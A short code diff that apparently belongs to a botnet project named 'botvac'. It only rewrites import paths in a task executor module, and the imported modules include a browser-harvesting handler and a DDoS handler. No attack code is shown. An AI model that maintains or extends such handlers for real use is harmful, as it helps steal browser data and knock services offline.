@@ -1,11 +1,11 @@
 import re
 from datetime import datetime
 
-from bot.botvac_constants import BotvacConstants
-from bot.handlers.browser_harvesting_handler import BrowserHarvestingHandler
-from bot.handlers.ddos_handler import DdosHandler
-from bot.objects.task import TaskResult
-from bot.objects.task import Task
+from botvac_constants import BotvacConstants
+from handlers.browser_harvesting_handler import BrowserHarvestingHandler
+from handlers.ddos_handler import DdosHandler
+from objects.task import TaskResult
+from objects.task import Task
 
 
 class BotvacTaskExecutor:
